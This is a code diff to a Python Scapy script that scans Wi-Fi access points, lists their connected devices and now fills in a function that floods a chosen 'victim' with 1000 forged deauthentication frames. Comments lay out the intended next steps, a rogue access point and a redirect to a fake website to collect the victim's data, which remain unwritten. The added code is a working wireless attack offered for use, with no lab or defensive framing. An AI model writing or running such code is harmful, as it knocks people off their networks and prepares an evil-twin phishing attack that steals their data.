@@ -1,5 +1,5 @@
 from scapy.all import *
-from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11
+from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap, Dot11Deauth
 import colorama
 
 colorama.init()
@@ -81,15 +81,19 @@ def print_ssid_list(ssid_list):
         counter += 1
 
 
-def deauthenticate_victim(param):
-    pass
+def deauthenticate_victim(victim_mac, ap_mac):
+    # Create a deauthentication frame with the victim's MAC address as the target
+    frame = RadioTap() / Dot11(addr1=victim_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
+
+    # Send the deauthentication frame
+    sendp(frame, iface=get_wireless_interface(), count=1000, inter=0.1)
 
 
 def print_connected_devices_list(connected_devices_list):
     counter = 0
     for device in connected_devices_list:
         print(f"{counter}) {device} \n")
-    counter += 1
+        counter += 1
 
 
 if __name__ == '__main__':
@@ -101,13 +105,15 @@ if __name__ == '__main__':
     choice = input("please choose the desired access point:")
     choice = int(choice)
     print(f"your desired AP is : {str(ssid_list[choice])}")
-    connected_devices_list = get_connected_devices(ssid_list[choice][1])
+    ap_mac = ssid_list[choice][1]
+    connected_devices_list = get_connected_devices(ap_mac)
     print_connected_devices_list(connected_devices_list)
     """ victim tracking down """
     choice_victim = input("please choose the desired unfortunate victim:")
     choice_victim = int(choice_victim)
-    deauthenticate_victim(connected_devices_list[choice_victim])
+    victim_mac = connected_devices_list[choice_victim]
+    deauthenticate_victim(victim_mac, ap_mac) # ✅✅✅
     """ create Raouge AP & send beacons to advertise it """
-    #missing code
+    # missing code
     """ once victim connected redirect to fake website to obtain the desired data from """
-    # missing code 
+    # missing code
